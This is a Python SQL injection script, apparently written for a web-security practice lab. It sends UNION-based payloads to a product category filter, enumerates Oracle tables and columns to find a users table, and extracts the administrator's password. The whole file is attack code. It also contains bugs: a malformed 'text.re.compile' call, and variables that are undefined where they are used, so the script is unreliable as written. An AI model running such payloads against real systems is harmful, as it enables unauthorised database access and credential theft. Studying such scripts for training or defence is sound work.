import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
import pyfiglet

# Display a banner using pyfiglet
ascii_banner = pyfiglet.figlet_format("RuhanSec")
print(ascii_banner)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080'}

def perform_request(url,sql_payload,):
    path = "/filter?category=Gifts"
    r = requests.get(url+path+sql_payload, verify=False , proxies=proxies)
    return r.text

def user_table(url):
    sql_payload = "' UNION select table_name,null FROM all_tables--"
    # lets see the response
    res = perform_request(url,sql_payload)
    soup = BeautifulSoup(res,'html.parser')
    user_table = soup.find(text = re.compile(r'\bUSERS\S*'))
    return user_table
    

def user_column(url,users_table):#because users_table has all the data of user_table in string
    sql_payload= "' UNION select column_name,NULL FROM all_tab_columns WHERE table_name='%s'--" % users_table
    res = perform_request(url,sql_payload)
    soup = BeautifulSoup(res,'html.parser')
    username_column= soup.find(text.re.compile('.*USERNAME.*'))
    password_column= soup.find(text.re.compile('.*PASSWORD.*'))
    return username_column,password_column



def administrator_cred(url,user_table,user_column):
    sql_payload = "' UNION select %s,%s FROM %s--" %(username_column,password_column,user_table)
    res = perform_request(url,sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_password = soup.find(text="administrator").parent.findNext('td').contents[0]
    return admin_password


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
       
    except IndexError:
        print("[-] Usage: %s <url>"% sys.argv[0]) #here argv[0] stands for file name
        print("[-] Example: %s www.example.com"% sys.argv[0])
        sys.exit(-1)
    
    print("Looking for the users table.....")
    users_table=user_table(url)
    if users_table:
        print("Found the users table name :%s"% users_table)
        username_column,password_column = user_column(url,sql_payload)
        if username_column and password_column:
            print("Found the username column : %s" %username_column)
            print("Found the password column : %s" %password_column)

            admin_password= administrator_cred(url,user_table,user_column)
            if admin_password:
                print("[+] The administrator password is: %s " % admin_password)
            else:
                print("Did not find the administrator password")
        else:
            print("Did not find the username and/or the password columns")
    else:
        print("Did not find a users table.")

    